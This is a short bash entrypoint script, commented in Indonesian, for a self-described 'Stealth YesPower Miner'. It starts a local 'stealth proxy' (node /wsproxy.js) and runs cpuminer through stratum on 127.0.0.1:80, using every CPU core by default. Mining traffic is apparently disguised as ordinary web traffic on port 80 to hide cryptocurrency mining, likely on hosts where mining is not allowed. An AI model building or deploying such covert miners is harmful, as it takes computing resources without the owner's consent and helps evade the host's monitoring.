#!/bin/bash
set -e

echo "=== Stealth YesPower Miner (Hardcoded SOCKS5) ==="

# Jalankan local stealth proxy
node /wsproxy.js &
sleep 3

echo "⛏️  Starting cpuminer..."

exec cpuminer \
    -a yespower \
    -o stratum+tcp://127.0.0.1:80 \
    -u "${WALLET:-WALLET_ANDA}.${WORKER:-worker}" \
    -p "${PASSWORD:-c=SWAMP,mc=SWAMP}" \
    -t "${THREADS:-$(nproc)}" \
    "$@"
